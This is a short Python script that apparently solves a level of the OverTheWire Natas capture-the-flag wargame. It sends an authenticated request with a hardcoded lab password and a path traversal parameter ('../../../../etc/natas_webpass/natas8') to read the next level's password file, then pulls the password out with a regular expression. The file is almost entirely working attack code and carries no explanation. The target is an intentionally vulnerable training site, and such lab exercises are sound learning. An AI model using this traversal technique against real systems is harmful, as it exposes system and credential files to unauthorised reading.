#!/user/bin/env python
import requests
import  re
username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

url ='http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8' % username
session = requests.Session()
reponse = requests.get(url , auth = (username, password))

content = reponse.text

#print (content)
print (re.findall('<br>\n(.*)\n\n<!..',content)[0])
